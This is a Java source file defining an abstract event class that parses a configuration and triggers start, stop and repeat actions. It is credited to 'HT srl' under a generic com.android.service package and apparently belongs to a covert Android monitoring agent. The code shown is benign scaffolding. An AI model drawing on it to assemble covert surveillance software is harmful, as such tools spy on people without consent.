/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.event;

import com.android.service.Status;
import com.android.service.ThreadBase;
import com.android.service.action.Action;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class EventBase.
 */
public abstract class BaseEvent extends ThreadBase {

	/** The Constant TAG. */
	private static final String TAG = "EventBase"; //$NON-NLS-1$

	// Gli eredi devono implementare i seguenti metodi astratti

	/**
	 * Parses the.
	 * 
	 * @param event
	 *            the event
	 */
	protected abstract boolean parse(EventConf event);

	/** The event. */
	protected EventConf conf;
	private int iterCounter;

	public int getId() {		
		return conf.getId();
	}

	public String getType(){
		return conf.getType();
	}
	
	/**
	 * Sets the event.
	 * 
	 * @param event
	 *            the new event
	 */
	public boolean setConf(final EventConf conf) {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		this.conf = conf;
		boolean ret = parse(conf);
		iterCounter=conf.iter;
		return ret;
		
	}

	private final boolean trigger(int actionId) {
		if (actionId != Action.ACTION_NULL) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " event: " + this + " triggering: " + actionId);//$NON-NLS-1$ //$NON-NLS-2$
			}
			Status.self().triggerAction(actionId);
			return true;
		}else{
			return false;
		}
	}	
	
	protected int getDelay(){
		return conf.delay;
	}
	
	protected synchronized boolean stillIter(){
		iterCounter--;
		return iterCounter>=0;
	}

	protected boolean triggerStartAction() {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.startAction);
	}

	protected boolean triggerStopAction() {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.stopAction);
	}

	protected boolean triggerRepeatAction() {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		return trigger(conf.repeatAction);
	}

	@Override
	public String toString() {
		return "Event " + conf.getId() + " " + conf.desc + " type:" + conf.getType() + " s: " + getStatus(); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
	}
	


}